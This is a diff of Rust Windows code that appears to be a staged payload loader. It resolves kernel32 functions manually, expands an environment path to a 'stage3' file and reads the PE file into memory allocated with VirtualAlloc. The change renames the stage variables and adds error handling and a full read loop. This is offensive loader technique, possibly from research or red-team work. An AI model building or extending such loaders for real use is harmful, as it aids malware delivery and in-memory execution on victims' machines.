@@ -53,27 +53,19 @@ pub extern "C" fn main() -> u32 {
     let GetModuleHandleA = fetch_get_module_handle(kernel32_ptr);
     let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernel32_ptr);
 
-    // let wsprintfa_ptr = get_func_by_name(u32_dll, wsprintfa_.as_ptr());
-    // if wsprintfa_ptr.is_null() {
-    //     unsafe {
-    //         asm!("int 3");
-    //     }
-    // }
-    // let wsprintfa: wsprintfaFn = unsafe { core::mem::transmute(wsprintfa_ptr) };
-
-    let mut stage2_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
+    let mut stage3_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
     unsafe {
         (ExpandEnvironmentStringsA)(
             STAGE3_ENV_FILENAME.as_ptr(),
-            stage2_filename.as_mut_ptr() as *mut _,
-            core::mem::size_of_val(&stage2_filename) as u32,
+            stage3_filename.as_mut_ptr() as *mut _,
+            core::mem::size_of_val(&stage3_filename) as u32,
         );
     }
 
     // Open the stage2 payload
     let handle = unsafe {
         CreateFileA(
-            stage2_filename.as_ptr() as *const i8,
+            stage3_filename.as_ptr() as *const i8,
             CreateFileAccess::GenericRead as u32,
             0,
             core::ptr::null_mut() as PVOID,
@@ -83,25 +75,44 @@ pub extern "C" fn main() -> u32 {
         )
     };
 
+    if handle as usize == usize::MAX {
+        debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
+        unsafe {
+            core::arch::asm!("int 3");
+        }
+    }
+
     let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };
 
     // Allocate memory for the stage 2 payload
-    let stage2_data =
+    let stage3_data =
         unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };
 
-    // Read the entire PE file to memory. This is a bit unnecessary, but whatever
-    unsafe {
-        ReadFile(
-            handle,
-            stage2_data,
-            stage2_size,
-            core::ptr::null_mut(),
-            core::ptr::null_mut(),
-        )
-    };
+    // Read the PE file into memory
+    let mut remaining_size = stage2_size;
+    let mut write_ptr = stage3_data;
+    while remaining_size > 0 {
+        let mut bytes_read = 0u32;
+
+        unsafe {
+            if ReadFile(
+                handle,
+                write_ptr,
+                remaining_size,
+                &mut bytes_read as *mut _,
+                core::ptr::null_mut(),
+            ) == 0
+            {
+                debug_print!("Reading stage3 failed");
+                core::arch::asm!("int 3");
+            }
+            write_ptr = write_ptr.offset(bytes_read as _);
+        }
+        remaining_size -= bytes_read;
+    }
 
     let pe_data =
-        unsafe { core::slice::from_raw_parts(stage2_data as *const u8, stage2_size as usize) };
+        unsafe { core::slice::from_raw_parts(stage3_data as *const u8, stage2_size as usize) };
 
     // unsafe { asm!("int 3") };
 
